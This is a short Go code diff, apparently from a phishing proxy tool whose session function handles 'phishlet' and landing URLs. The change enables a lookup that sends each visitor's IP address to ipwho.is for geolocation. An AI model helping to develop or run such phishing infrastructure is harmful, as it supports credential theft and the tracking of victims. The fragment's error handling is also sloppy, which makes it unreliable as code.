@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"strings"
 	"time"
 
 	"github.com/tidwall/buntdb"
@@ -65,12 +64,12 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 
 	jf, _ := json.Marshal(s)
 
-// 	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
-// 	if ipinfoerr != nil {
-// 		fmt.Print("error")
-// 	}
+	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
+	if ipinfoerr != nil {
+		fmt.Print("error")
+	}
 
-// 	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
+	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
 
 // 	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
 
